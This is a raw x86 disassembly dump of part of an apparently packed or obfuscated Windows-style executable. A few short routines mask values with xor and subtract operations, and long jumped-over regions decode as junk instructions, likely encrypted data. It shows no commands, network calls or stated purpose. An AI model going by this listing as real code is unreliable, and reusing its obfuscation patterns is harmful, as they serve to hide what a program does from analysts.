  406a3a:	sub    eax,edi
  406a3c:	xor    eax,esi
  406a3e:	mov    DWORD PTR [ebp+0xc],eax
  406a41:	mov    ecx,DWORD PTR [ebp-0x4]
  406a44:	mov    eax,DWORD PTR [ebp+0xc]
  406a47:	xor    ecx,esi
  406a49:	add    ecx,edi
  406a4b:	xor    edx,edx
  406a4d:	div    ecx
  406a4f:	mov    ecx,DWORD PTR [ebp-0x8]
  406a52:	cmp    ecx,eax
  406a54:	jne    0x406a5f
  406a5a:	call   0x401000
  406a5f:	lea    eax,[ebp+0x4]
  406a62:	mov    DWORD PTR [ebp-0x24],eax
  406a65:	mov    eax,ds:0x413b34
  406a6a:	push   0x4
  406a6c:	add    eax,0x1cc
  406a71:	push   eax
  406a72:	lea    eax,[ebp-0xc]
  406a75:	push   eax
  406a76:	call   0x40f058
  406a7b:	mov    eax,DWORD PTR [ebp-0xc]
  406a7e:	mov    eax,DWORD PTR [ebp-0x4]
  406a81:	mov    eax,DWORD PTR [ebp-0x8]
  406a84:	mov    DWORD PTR [ebp+0xc],eax
  406a87:	mov    eax,ds:0x413bb8
  406a8c:	mov    ecx,DWORD PTR [ebp+0xc]
  406a8f:	sub    eax,edi
  406a91:	xor    eax,esi
  406a93:	cmp    eax,ecx
  406a95:	je     0x406adc
  406a9b:	mov    eax,ds:0x413bb0
  406aa0:	mov    ecx,DWORD PTR [ebp+0xc]
  406aa3:	sub    eax,edi
  406aa5:	xor    eax,esi
  406aa7:	cmp    eax,ecx
  406aa9:	jne    0x406abf
  406aaf:	mov    eax,ds:0x413bb8
  406ab4:	add    eax,DWORD PTR ds:0x413bb0
  406aba:	jmp    0x406ac6
  406abf:	mov    eax,DWORD PTR [ebp+0xc]
  406ac2:	xor    eax,esi
  406ac4:	add    eax,edi
  406ac6:	mov    ds:0x413bb0,eax
  406acb:	mov    eax,DWORD PTR [ebp+0xc]
  406ace:	xor    eax,esi
  406ad0:	add    eax,edi
  406ad2:	mov    ds:0x413bb8,eax
  406ad7:	jmp    0x406ae6
  406adc:	mov    eax,ds:0x413bb8
  406ae1:	mov    ds:0x413bb0,eax
  406ae6:	mov    eax,DWORD PTR [ebp-0x24]
  406ae9:	mov    ecx,DWORD PTR ds:0x413bb0
  406aef:	add    DWORD PTR [eax],ecx
  406af1:	mov    eax,DWORD PTR [ebp-0xc]
  406af4:	mov    eax,DWORD PTR [eax]
  406af6:	pop    edi
  406af7:	pop    esi
  406af8:	pop    ebx
  406af9:	jmp    0x406b0b
  406afe:	push   0x87687689
  406b03:	call   DWORD PTR ds:0x412364
  406b09:	xor    eax,eax
  406b0b:	leave  
  406b0c:	ret    0xc
  406b0f:	push   ebp
  406b10:	mov    ebp,esp
  406b12:	push   ecx
  406b13:	mov    DWORD PTR ds:0x433693,0x272d
  406b1d:	push   ecx
  406b1e:	mov    eax,0x5a3fc98
  406b23:	mov    DWORD PTR [ebp-0x4],eax
  406b26:	mov    DWORD PTR ds:0x433667,ecx
  406b2c:	mov    ecx,DWORD PTR [ebp-0x4]
  406b2f:	mov    DWORD PTR ds:0x433693,0x4de2
  406b39:	mov    DWORD PTR [ebp-0x8],0x4ec1
  406b40:	mov    DWORD PTR ds:0x43360f,0x33b9
  406b4a:	cmp    ecx,eax
  406b4c:	jne    0x40734f
  406b52:	or     ecx,DWORD PTR ds:0x43369b
  406b58:	mov    ax,WORD PTR [ebp-0x8]
  406b5c:	sbb    DWORD PTR ds:0x43361b,ebx
  406b62:	mov    ecx,0x8a3c
  406b67:	mov    DWORD PTR ds:0x4336d3,0x29a7
  406b71:	jmp    0x406d50
  406b76:	cwde   
  406b77:	sahf   
  406b78:	inc    edi
  406b79:	mov    bh,0x41
  406b7b:	ja     0x406be5
  406b7d:	mov    cl,0xc9
  406b7f:	mov    DWORD PTR [ecx],0xf5de6d5f
  406b85:	push   esi
  406b86:	add    bh,BYTE PTR [ebx]
  406b88:	jle    0x406c08
  406b8a:	mov    esp,0x597e7e7f
  406b8f:	dec    ebp
  406b90:	mov    gs,ecx
  406b92:	pop    ebx
  406b93:	mov    al,0xcf
  406b95:	inc    eax
  406b96:	fmulp  st(1),st
  406b98:	push   ds
  406b99:	fs ins BYTE PTR es:[edi],dx
  406b9b:	jmp    0x22e3f26c
  406ba0:	jb     0x406bfd
  406ba2:	sub    ecx,DWORD PTR [eax+ecx*1]
  406ba5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406ba6:	xchg   ecx,eax
  406ba7:	in     al,dx
  406ba8:	fld    DWORD PTR [esi-0x32]
  406bab:	les    edx,FWORD PTR [edi+0x5cfe3c89]
  406bb1:	mov    es:0x3ae75232,al
  406bb7:	xchg   esp,eax
  406bb8:	mov    esi,eax
  406bba:	push   ecx
  406bbb:	pop    esp
  406bbc:	outs   dx,BYTE PTR ds:[esi]
  406bbd:	or     DWORD PTR [esi+ecx*2-0x57],eax
  406bc1:	dec    DWORD PTR [edi+0x79]
  406bc4:	mov    ch,0x94
  406bc6:	xor    DWORD PTR [eax+0x52],ecx
  406bc9:	ins    BYTE PTR es:[edi],dx
  406bca:	ror    BYTE PTR ds:0xa97c9540,0xe1
  406bd1:	jle    0x406c1b
  406bd3:	or     edi,DWORD PTR [esi+0x7c]
  406bd6:	inc    esp
  406bd7:	iret   
  406bd8:	pop    esp
  406bd9:	(bad)  
  406bda:	ins    BYTE PTR es:[edi],dx
  406bdb:	pushf  
  406bdc:	mov    esi,0xbf480fc1
  406be1:	adc    ebp,DWORD PTR [ebx-0xe]
  406be4:	jae    0x406b6a
  406be6:	mov    ds:0x5c3c076c,eax
  406beb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406bec:	loope  0x406c3b
  406bee:	jmp    0x406b7c
  406bf0:	addr16 mov bh,0x6a
  406bf3:	lock pop edx
  406bf5:	cmp    ah,BYTE PTR [ebx+ebp*2]
  406bf8:	arpl   si,bx
  406bfa:	pop    edx
  406bfb:	mov    DWORD PTR [edi+0x38],0xc58d33e4
  406c02:	adc    esi,DWORD PTR [edi+esi*1]
  406c05:	(bad)  
  406c07:	(bad)  
  406c08:	icebp  
  406c09:	out    0xa4,eax
  406c0b:	aaa    
  406c0c:	mov    ds:0xa1890f0d,eax
  406c11:	out    dx,al
  406c12:	(bad)  [ecx]
  406c14:	mov    ebp,0xad6e9e8a
  406c19:	cmp    DWORD PTR [ebx-0x6d],0xe430da3c
  406c20:	aam    0x7b
  406c22:	inc    esi
  406c23:	(bad)  
  406c24:	cld    
  406c25:	mov    cl,0x2f
  406c27:	dec    ebx
  406c28:	addr16 push es
  406c2a:	xor    edi,DWORD PTR [ebx+0xd]
  406c2d:	pop    esi
  406c2e:	out    0x2d,al
  406c30:	fwait
  406c31:	mov    edi,DWORD PTR [ebx+esi*8]
  406c34:	or     BYTE PTR [ebx-0x27276fc6],bl
  406c3a:	pop    eax
  406c3b:	or     BYTE PTR [edi+0x7aec5e71],bh
  406c41:	stos   BYTE PTR es:[edi],al
  406c42:	(bad)  
  406c44:	in     eax,0xfd
  406c46:	dec    edx
  406c47:	scas   al,BYTE PTR es:[edi]
  406c48:	das    
  406c49:	adc    bh,BYTE PTR [edx]
  406c4b:	dec    edx
  406c4c:	imul   edi,DWORD PTR [eax-0x4df88519],0x739c5ab2
  406c56:	out    0xa9,al
  406c58:	lock push ebx
  406c5a:	sub    ebp,edx
  406c5c:	test   DWORD PTR [esp+edi*2-0x3861269d],edx
  406c63:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406c64:	ret    0x8552
  406c67:	sbb    al,0x17
  406c69:	in     al,0xa2
  406c6b:	inc    eax
  406c6c:	bound  eax,QWORD PTR [ecx-0x4]
  406c6f:	das    
  406c70:	dec    ebp
  406c71:	jp     0x406c59
  406c73:	enter  0xa00a,0xce
  406c77:	test   BYTE PTR [edi+0x65],cl
  406c7a:	push   edi
  406c7b:	cli    
  406c7c:	out    0x97,al
  406c7e:	cmp    ebp,DWORD PTR [eax]
  406c80:	repnz mov DWORD PTR [edi+0x7d],edx
  406c84:	retf   
  406c85:	xor    eax,0x977ca73d
  406c8a:	pop    eax
  406c8b:	ins    DWORD PTR es:[edi],dx
  406c8c:	xchg   ecx,eax
  406c8d:	(bad)  
  406c8e:	jmp    0x8289703e
  406c93:	cwde   
  406c94:	jge    0x406c47
  406c96:	dec    ebp
  406c97:	xchg   edx,eax
  406c98:	(bad)  
  406c99:	xor    esi,edi
  406c9b:	(bad)  
  406c9c:	pop    edx
  406c9d:	icebp  
  406c9e:	dec    ecx
  406c9f:	sahf   
  406ca0:	fstp   TBYTE PTR [ebp+0x10]
  406ca3:	cmp    ch,BYTE PTR [edx-0x173dbadb]
  406ca9:	pop    esp
  406caa:	addr16 sub cl,ah
  406cad:	aaa    
  406cae:	add    DWORD PTR [edx],eax
  406cb0:	(bad)  
  406cb1:	outs   dx,DWORD PTR ds:[esi]
  406cb2:	push   ecx
  406cb3:	jb     0x406d30
  406cb5:	and    al,0x52
  406cb7:	cmp    BYTE PTR [ebp+0x64e3111a],dh
  406cbd:	outs   dx,DWORD PTR ds:[esi]
  406cbe:	add    edi,eax
  406cc0:	xchg   edi,eax
  406cc1:	mov    al,0xeb
  406cc3:	xchg   ebx,eax
  406cc4:	mov    edi,0x8b3dcf3a
  406cc9:	call   0x1495316b
  406cce:	popf   
  406ccf:	dec    edx
  406cd0:	inc    esp
  406cd1:	push   edx
  406cd2:	and    edi,DWORD PTR [ebp-0x64f89713]
  406cd8:	stos   DWORD PTR es:[edi],eax
  406cd9:	outs   dx,BYTE PTR ds:[esi]
  406cda:	xchg   esp,eax
  406cdb:	xchg   ebp,eax
  406cdc:	arpl   WORD PTR [ebp-0x56ab94ca],bx
  406ce2:	mov    cl,0x31
  406ce4:	data16 movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406ce6:	inc    ebp
  406ce7:	fs push ds
  406ce9:	mov    cl,0x8d
  406ceb:	idiv   eax
  406ced:	pslld  mm0,QWORD PTR [eax+0x17]
  406cf1:	ins    DWORD PTR es:[edi],dx
  406cf2:	mov    ah,0xa5
  406cf4:	pop    ebp
  406cf5:	mov    ch,0xe3
  406cf7:	mov    bl,0x2f
  406cf9:	mul    esp
  406cfb:	not    BYTE PTR [ecx+0x1f736b97]
  406d01:	jecxz  0x406c86
  406d03:	adc    BYTE PTR [edi],bh
  406d05:	shr    BYTE PTR [ecx+0x70],1
  406d08:	and    BYTE PTR [edi-0xd],ch
  406d0b:	sahf   
  406d0c:	inc    esp
  406d0d:	popf   
  406d0e:	out    dx,eax
  406d0f:	and    eax,0xf6024538
  406d14:	adc    al,0xa0
  406d16:	pop    ebp
  406d17:	pop    ecx
  406d18:	jbe    0x406ce1
  406d1a:	aaa    
  406d1b:	icebp  
  406d1c:	loopne 0x406d10
  406d1e:	(bad)  [edx+0x30]
  406d21:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406d22:	wrmsr  
  406d24:	mov    ch,0x3a
  406d26:	pop    ebp
  406d27:	(bad)  
  406d28:	gs test eax,0xe203f53e
  406d2e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406d2f:	add    al,0xc5
  406d31:	xchg   ebp,eax
  406d32:	nop    DWORD PTR [ebp+0x4b184a42]
  406d39:	pop    edi
  406d3a:	in     eax,dx
  406d3b:	fwait
  406d3c:	pop    edx
  406d3d:	in     eax,dx
  406d3e:	stos   DWORD PTR es:[edi],eax
  406d3f:	fbld   TBYTE PTR [edi]
  406d41:	jle    0x406d43
  406d43:	sbb    edi,DWORD PTR [bp+0x6d80]
  406d48:	mov    bh,0xe4
  406d4a:	sbb    bh,dl
  406d4c:	lods   al,BYTE PTR ds:[esi]
  406d4d:	les    edx,FWORD PTR [ebx-0x3ecc99d0]
  406d53:	mov    ecx,0x3b02
  406d58:	sbb    DWORD PTR ds:0x43372f,0x433613
  406d62:	add    ax,cx
  406d65:	add    DWORD PTR ds:0x433723,0x7d57
  406d6f:	mov    ecx,DWORD PTR [ebp+0x8]
  406d72:	movzx  eax,ax
  406d75:	sbb    DWORD PTR ds:0x433663,0x43360f
  406d7f:	jmp    0x406f5e
  406d84:	cmp    DWORD PTR [ebx],ebp
  406d86:	es fdivrp st(4),st
  406d89:	repz shr DWORD PTR [ecx],0x6c
  406d8d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406d8e:	pop    esi
  406d8f:	xor    al,0x72
  406d91:	bnd jns 0x406d70
  406d94:	inc    eax
  406d95:	cmp    BYTE PTR [esi+0x7e],bh
  406d98:	mov    esp,0x317e7e7f
  406d9d:	push   cs
  406d9e:	icebp  
  406d9f:	cvtdq2ps xmm0,xmm4
  406da2:	aas    
  406da3:	pop    eax
  406da4:	sbb    al,0x43
  406da6:	push   esi
  406da7:	dec    eax
  406da8:	lods   al,BYTE PTR ds:[esi]
  406da9:	mov    dh,0x2e
  406dab:	cmp    esi,DWORD PTR [edx]
  406dad:	ret    0x5ce1
  406db0:	cli    
  406db1:	shr    BYTE PTR [esi+edx*1+0x2e65587f],0xfd
  406db9:	jbe    0x406e15
  406dbb:	imul   ebp,DWORD PTR [eax],0xffffffc1
  406dbe:	pop    esi
  406dbf:	xchg   esi,eax
  406dc0:	int3   
  406dc1:	enter  0x13de,0x8a
  406dc5:	mov    eax,ds:0x8a2bf070
  406dca:	imul   eax,DWORD PTR [ebx-0x7e],0x4e
  406dce:	daa    
  406dcf:	pop    ds
  406dd0:	sti    
  406dd1:	jmp    0x406e0a
  406dd3:	out    dx,al
  406dd4:	out    dx,al
  406dd5:	inc    eax
  406dd6:	sbb    bl,ah
  406dd8:	or     dl,BYTE PTR [ebx]
  406dda:	test   al,0xdb
  406ddc:	xchg   edx,eax
  406ddd:	push   edi
  406dde:	mov    ah,0x2b
  406de0:	xchg   ecx,eax
  406de1:	xor    DWORD PTR [eax+0x69],edi
  406de4:	in     al,0xb2
  406de6:	fld    DWORD PTR [edx-0x4b]
  406de9:	mov    DWORD PTR [ecx],0xa96ee9f1
  406def:	inc    edi
  406df0:	pushf  
  406df1:	retf   
  406df2:	push   edx
  406df3:	clc    
  406df4:	adc    BYTE PTR [ecx*1+0x689a533f],ah
  406dfb:	js     0x406e4e
  406dfd:	xor    BYTE PTR ds:0x3dd2fd81,ch
  406e03:	es cdq 
  406e05:	out    dx,eax
  406e06:	jp     0x406d88
  406e08:	test   al,0xd9
  406e0a:	test   DWORD PTR [ecx],edx
  406e0c:	out    dx,eax
  406e0d:	aam    0xd7
  406e0f:	ficomp DWORD PTR [eax]
  406e11:	or     ah,bl
  406e13:	jnp    0x406e8a
  406e15:	out    0xb3,al
  406e17:	fwait
  406e18:	xchg   ecx,eax
  406e19:	push   edi
  406e1a:	jno    0x406df7
  406e1c:	pop    ds
  406e1d:	leave  
  406e1e:	mov    ch,bh
  406e20:	jecxz  0x406df2
  406e22:	daa    
  406e23:	jns    0x406e59
  406e25:	pop    ss
  406e26:	mov    ds:0x301d62f6,al
  406e2b:	inc    edi
  406e2c:	das    
  406e2d:	pop    ecx
  406e2e:	fldcw  WORD PTR [edi-0x739ba26f]
  406e34:	push   ecx
  406e35:	inc    esi
  406e36:	lods   eax,DWORD PTR ds:[esi]
  406e37:	and    edx,DWORD PTR [edx]
  406e39:	sbb    al,0x71
  406e3b:	js     0x406e41
  406e3d:	mov    ds:0xd2900da3,al
  406e42:	fimul  DWORD PTR [esi+ecx*1]
  406e45:	popa   
  406e46:	adc    bl,ch
  406e48:	mov    ch,0x6c
  406e4a:	and    esp,eax
  406e4c:	(bad)  
  406e4e:	in     al,dx
  406e4f:	test   eax,0x1d614d66
  406e54:	aam    0x4
  406e56:	outs   dx,DWORD PTR ds:[esi]
  406e57:	les    ecx,FWORD PTR [eax+0x192c10b8]
  406e5d:	out    dx,al
  406e5e:	fild   WORD PTR [ecx]
  406e60:	lock mov esp,DWORD PTR [edi+eiz*8]
  406e64:	mov    DWORD PTR [eax-0x25],edx
  406e67:	add    eax,0x28cb3933
  406e6c:	retf   0x2ac8
  406e6f:	mov    al,0x6c
  406e71:	xor    DWORD PTR [ecx],ebp
  406e73:	jnp    0x406e2a
  406e75:	stc    
  406e76:	clc    
  406e77:	in     eax,0xbb
  406e79:	jb     0x406e57
  406e7b:	pop    ebx
  406e7c:	sti    
  406e7d:	inc    eax
  406e7e:	jo     0x406e22
  406e80:	xor    cl,BYTE PTR [eax]
  406e82:	out    dx,al
  406e83:	or     dh,ch
  406e85:	mov    ah,0xa8
  406e87:	fiadd  WORD PTR [esi]
  406e89:	std    
  406e8a:	inc    edx
  406e8b:	pusha  
  406e8c:	sub    eax,0xb79f7c2
  406e91:	sar    DWORD PTR [eax],cl
  406e93:	or     DWORD PTR [ecx-0x7a4f8dbd],eax
  406e99:	ret    
  406e9a:	xor    BYTE PTR [ebx],0x55
  406e9d:	cmp    DWORD PTR [esi+eax*4],esp
  406ea0:	mov    ah,0x93
  406ea2:	inc    esi
  406ea3:	pop    ebp
  406ea4:	daa    
  406ea5:	and    DWORD PTR [esi+0x2553befb],ebp
  406eab:	and    BYTE PTR [esi],0x69
  406eae:	out    dx,eax
  406eaf:	shl    DWORD PTR [edx+ebp*1+0x6c93528f],cl
  406eb6:	dec    edi
  406eb7:	into   
  406eb8:	pop    edi
  406eb9:	fdiv   st(2),st
  406ebb:	sub    BYTE PTR [ebp-0x41],0x51
  406ebf:	stc    
  406ec0:	sub    al,0x2f
  406ec2:	nop
  406ec3:	cs mov dl,0xd8
  406ec6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406ec7:	loope  0x406e72
  406ec9:	dec    ebp
  406eca:	and    eax,0x706fc727
  406ecf:	mov    dl,0xc4
  406ed1:	scas   al,BYTE PTR es:[edi]
  406ed2:	rcr    DWORD PTR [eax-0x25],1
  406ed5:	outs   dx,DWORD PTR ds:[esi]
  406ed6:	fcomp  QWORD PTR [ecx]
  406ed8:	std    
  406ed9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406eda:	lea    ebx,[ebx-0x20]
  406edd:	push   esi
  406ede:	cli    
  406edf:	or     BYTE PTR [esi+0x64],ch
  406ee2:	xchg   ebp,eax
  406ee3:	xchg   edx,eax
  406ee4:	push   edi
  406ee5:	pop    cx
  406ee7:	or     eax,0x1d94ee5
  406eec:	lds    ecx,FWORD PTR [ebx+0x111072c7]
  406ef2:	loopne 0x406f40
  406ef4:	ds int3 
  406ef6:	xchg   edi,eax
  406ef7:	jl     0x406e79
  406ef9:	adc    ah,BYTE PTR ds:0x661e96e
  406eff:	add    dl,dh
  406f01:	or     al,0x6a
  406f03:	aaa    
  406f04:	dec    ebp
  406f05:	int3   
  406f06:	pop    esp
  406f07:	test   ecx,esi
  406f09:	scas   eax,DWORD PTR es:[edi]
  406f0a:	retf   
  406f0b:	lods   al,BYTE PTR ds:[esi]
  406f0c:	in     eax,0xa5
  406f0e:	rcl    ah,0x7e
  406f11:	frstor es:[edi+0x28]
  406f16:	pop    ecx
  406f17:	push   ebp
  406f18:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406f19:	int3   
  406f1a:	sub    ch,BYTE PTR [ebx-0x3a]
  406f1d:	pop    esp
  406f1e:	int3   
  406f1f:	ins    BYTE PTR es:[edi],dx
  406f20:	xor    DWORD PTR [esi-0x40],esi
  406f23:	lock sbb esp,0x29be2f65
  406f2a:	adc    BYTE PTR gs:[edx],dh
  406f2d:	fdivr  DWORD PTR [ebx]
  406f2f:	or     DWORD PTR [ebp+0x34e64b6b],0x65
  406f36:	shl    eax,1
  406f38:	lahf   
  406f39:	jo     0x406ed0
  406f3b:	and    edx,DWORD PTR [ebx-0x4d]
  406f3e:	pop    edi
  406f3f:	adc    BYTE PTR [eax],ch
  406f41:	sbb    DWORD PTR [edi+0xe],eax
  406f44:	retf   0xab1b
  406f47:	push   ebx
  406f48:	jl     0x406f29
  406f4a:	hlt    
  406f4b:	lock sti 
  406f4d:	cmc    
  406f4e:	fst    st(4)
  406f50:	push   ss
  406f51:	xor    BYTE PTR [edi+0x4a],ah
  406f54:	jl     0x406f50
  406f56:	or     DWORD PTR [eax+0x6d084c75],0xd0f78370
  406f60:	and    DWORD PTR ds:0x43360f,0x433653
  406f6a:	and    eax,DWORD PTR [ecx]
  406f6c:	mov    ecx,DWORD PTR [ebp+0x8]
  406f6f:	mov    DWORD PTR [ecx],eax
  406f71:	jmp    0x406f7d
  406f76:	xor    DWORD PTR [ebp-0x4],0xe149eb8
  406f7d:	mov    ax,WORD PTR [ebp-0x8]
  406f81:	jmp    0x407160
  406f86:	dec    ebx
  406f87:	rcr    BYTE PTR [ecx],0x72
  406f8a:	mov    cl,0x73
  406f8c:	push   ecx
  406f8d:	loope  0x406f7e
  406f8f:	sahf   
  406f90:	adc    al,BYTE PTR ds:0xdba11608
  406f96:	mov    es,esi
  406f98:	jle    0x407018
  406f9a:	mov    esp,0x7e7e7f
  406f9f:	sbb    BYTE PTR [ebx+0x69],dh
  406fa2:	out    dx,eax
  406fa3:	mov    ecx,0x87b925e5
  406fa8:	stc    
  406fa9:	or     al,0x9b
  406fab:	xor    ch,al
  406fad:	sbb    al,al
  406faf:	inc    ebx
  406fb0:	cwde   
  406fb1:	js     0x406fb0
  406fb3:	clc    
  406fb4:	sti    
  406fb5:	aam    0x79
  406fb7:	cli    
  406fb8:	repnz cld 
  406fba:	sub    ecx,edi
  406fbc:	out    dx,al
  406fbd:	int3   
  406fbe:	nop
  406fbf:	lods   al,BYTE PTR ds:[esi]
  406fc0:	jo     0x406fc4
  406fc2:	jbe    0x406fb3
  406fc4:	sahf   
  406fc5:	add    BYTE PTR [ecx+0x7999bdbe],dh
  406fcb:	pop    es
  406fcc:	sbb    dh,BYTE PTR ds:[ebx-0x7c]
  406fd0:	pop    edx
  406fd1:	fisubr WORD PTR [edi+esi*2+0x73]
  406fd5:	int3   
  406fd6:	xchg   esi,eax
  406fd7:	fnsave [eax]
  406fd9:	lods   eax,DWORD PTR ds:[esi]
  406fda:	arpl   WORD PTR [eax-0x61],di
  406fdd:	add    ch,al
  406fdf:	xor    cl,bh
  406fe1:	sbb    eax,0x99495e4a
  406fe6:	imul   ebx,DWORD PTR cs:[esi-0x68611c21],0x0
  406fee:	outs   dx,BYTE PTR ds:[esi]
  406fef:	scas   eax,DWORD PTR es:[edi]
  406ff0:	push   cs
  406ff1:	bound  esp,QWORD PTR [esi]
  406ff3:	add    edi,DWORD PTR [eax-0x5d]
  406ff6:	imul   esp,DWORD PTR [ecx+0x4f8002d6],0x5b75e12
  407000:	loope  0x406fe0
  407002:	leave  
  407003:	sbb    bl,0x35
  407006:	stos   DWORD PTR es:[edi],eax
  407007:	(bad)  
  407008:	dec    edx
  407009:	push   0x76a41bbf
  40700e:	fdiv   DWORD PTR [esi-0x62832da]
  407014:	sar    DWORD PTR [edx],cl
  407016:	or     eax,DWORD PTR [eax+0x6922aa35]
  40701c:	dec    eax
  40701d:	jo     0x406fcb
  40701f:	inc    esi
  407020:	mov    dl,0x18
  407022:	adc    esp,esp
  407024:	push   eax
  407025:	outs   dx,DWORD PTR ds:[esi]
  407026:	cmp    BYTE PTR [esi+0x2c87da5a],cl
  40702c:	inc    esi
  40702d:	xchg   BYTE PTR [ecx],cl
  40702f:	jne    0x407004
  407031:	loope  0x407069
  407033:	sbb    al,0xc0
  407035:	pusha  
  407036:	in     eax,dx
  407037:	enter  0x6cba,0x93
  40703b:	or     ecx,DWORD PTR [ebx+0x36]
  40703e:	shr    BYTE PTR [ecx-0x44],1
  407041:	bound  esi,QWORD PTR [ebp+0x26423bd3]
  407047:	jmp    DWORD PTR ss:[ecx-0x34c98edd]
  40704e:	out    0x40,al
  407050:	pop    edx
  407051:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407052:	mov    ds:0xbf6db977,eax
  407057:	xor    esi,DWORD PTR [edx-0x46e08d80]
  40705d:	in     al,dx
  40705e:	scas   eax,DWORD PTR es:[edi]
  40705f:	mov    WORD PTR [esi-0x37],?
  407062:	in     eax,dx
  407063:	xchg   ebp,eax
  407064:	lock add DWORD PTR [esi],esi
  407067:	sub    ecx,DWORD PTR [ebx+0x16cf693a]
  40706d:	inc    esp
  40706e:	bound  ebp,QWORD PTR [edx]
  407070:	push   edx
  407071:	inc    eax
  407072:	push   es
  407073:	xchg   ebp,eax
  407074:	adc    DWORD PTR [ebx],esp
  407076:	lea    esp,[ebx]
  407078:	lods   al,BYTE PTR ds:[esi]
  407079:	bnd jp 0x407004
  40707c:	jb     0x4070c2
  40707e:	or     eax,0xce2f2bf9
  407083:	shl    BYTE PTR [eax+0x57a72370],cl
  407089:	mov    DWORD PTR [esi-0x2d],edx
  40708c:	jg     0x4070ce
  40708e:	repnz loop 0x4070a8
  407091:	je     0x4070fb
  407093:	test   DWORD PTR [esi+0x50],0x3138cd1e
  40709a:	push   0x77ebe367
  40709f:	test   DWORD PTR [edx-0x37c208dd],0xc0755b1
  4070a9:	dec    ebp
  4070aa:	mov    eax,ds:0xb1d777bb
  4070af:	adc    eax,0xe3339b99
  4070b4:	setge  BYTE PTR [eax+0x38fffdae]
  4070bb:	cmp    dh,BYTE PTR ds:0xcc087802
  4070c1:	ja     0x40707c
  4070c3:	jae    0x4070ba
  4070c5:	pushf  
  4070c6:	pop    ecx
  4070c7:	cmp    eax,0x667f2de7
  4070cc:	in     al,dx
  4070cd:	ds int 0xa1
  4070d0:	or     eax,0x1dac5b9e
  4070d5:	dec    edx
  4070d6:	adc    al,0xd9
  4070d8:	aad    0x7a
  4070da:	jbe    0x4070ee
  4070dc:	(bad)  
  4070dd:	imul   esi,DWORD PTR cs:[eax],0x65
  4070e1:	jecxz  0x40710a
  4070e3:	mov    cl,0xc3
  4070e5:	ret    0xa835
  4070e8:	shl    ah,cl
  4070ea:	and    eax,DWORD PTR [eax+edx*1]
  4070ed:	sbb    ch,BYTE PTR [ecx]
  4070ef:	int    0xe0
  4070f1:	mov    al,0xd1
  4070f3:	pushf  
  4070f4:	or     eax,0x2f7b4ad9
  4070f9:	add    ch,BYTE PTR [ecx+0x8]
  4070fc:	jo     0x4070d7
  4070fe:	sub    eax,0xfdbfbeef
  407103:	fidivr DWORD PTR [eax]
  407105:	mov    ebp,0x92f97f10
  40710a:	rcl    DWORD PTR [eax+0x3a],0x7d
  40710e:	mov    bh,0x6
  407110:	adc    al,0x77
  407112:	or     BYTE PTR [ecx+0x59f68c6c],0x75
  407119:	and    eax,0x4b1ed73b
  40711e:	out    0x4b,al
  407120:	cmp    esp,esi
  407122:	sahf   
  407123:	loopne 0x407178
  407125:	adc    esp,DWORD PTR [edi-0xdb62118]
  40712b:	fxch   st(1)
  40712d:	mov    ch,0x21
  40712f:	or     BYTE PTR [edi+edi*1-0x6527c1de],cl
  407136:	les    eax,FWORD PTR [ebx-0x7d4a06e8]
  40713c:	push   ds
  40713d:	fadd   DWORD PTR [edi-0x77b11394]
  407143:	call   0x5bfce5c8
  407148:	and    ebx,esi
  40714a:	xchg   edi,eax
  40714b:	push   cs
  40714c:	xchg   BYTE PTR [edi],bh
  40714e:	push   0xffffffbc
  407150:	pop    edi
  407151:	outs   dx,BYTE PTR ds:[si]
  407153:	(bad)  
  407154:	addr16 mov esp,0xe9c8e5c8
  40715a:	mov    ds:0xee18ecd1,eax
  40715f:	cli    
  407160:	push   DWORD PTR [ebp+0x8]
  407163:	call   0x407353
  407168:	test   eax,eax
  40716a:	jmp    0x407349
  40716f:	and    eax,0xb1edb090
  407174:	in     eax,dx
  407175:	popa   
  407176:	push   eax
  407177:	retf   
  407178:	xchg   BYTE PTR [ebx-0x74],dh
  40717b:	and    bl,BYTE PTR [esi+esi*8]
  40717e:	int    0xcc
  407180:	les    edi,FWORD PTR [esi+0x7e]
  407183:	mov    esp,0x6a7e7e7f
  407188:	pop    es
  407189:	(bad)  
  40718a:	jne    0x407132
  40718c:	into   
  40718d:	(bad)  
  40718e:	fcmovb st,st(3)
  407190:	mov    ebp,0xc0d99b09
  407195:	fcomp  QWORD PTR [ecx]
  407197:	jnp    0x407148
  407199:	add    DWORD PTR [esi+edx*1+0x2e0910aa],ebx
  4071a0:	mov    esp,0xc66ee8bc
  4071a5:	add    BYTE PTR [esi],al
  4071a7:	aad    0x2c
  4071a9:	mov    ss,WORD PTR [ebx]
  4071ab:	call   0x388c:0x9690b022
  4071b2:	fmul   st(3),st
  4071b4:	fninit 
  4071b6:	mov    ebx,0xcbcdb35c
  4071bb:	push   0x26
  4071bd:	inc    edi
  4071be:	push   ebx
  4071bf:	xchg   esi,eax
  4071c0:	sbb    edx,DWORD PTR [edi]
  4071c2:	(bad)  
  4071c4:	scas   al,BYTE PTR es:[edi]
  4071c5:	mov    dl,0xd0
  4071c7:	mov    ch,0x1e
  4071c9:	in     al,0xc3
  4071cb:	pushf  
  4071cc:	pusha  
  4071cd:	cmp    BYTE PTR [eax-0x37],al
  4071d0:	dec    esi
  4071d1:	push   cs
  4071d2:	popa   
  4071d3:	inc    esi
  4071d4:	pop    eax
  4071d5:	lahf   
  4071d6:	cdq    
  4071d7:	sti    
  4071d8:	retf   0x7ab2
  4071db:	jbe    0x407176
  4071dd:	inc    edx
  4071de:	xchg   ecx,eax
  4071df:	jbe    0x4071bb
  4071e1:	shl    DWORD PTR [ebp+0x53],0x37
  4071e5:	aam    0xf6
  4071e7:	push   ss
  4071e8:	xor    ecx,DWORD PTR [ecx+edx*8-0x3b]
  4071ec:	arpl   WORD PTR [ebp+0x3ebb12e1],bx
  4071f2:	and    bl,BYTE PTR [esi+0x75]
  4071f5:	inc    ecx
  4071f6:	in     eax,dx
  4071f7:	cmp    DWORD PTR [eax],0xd7d8b8f9
  4071fd:	jmp    0x816d17b9
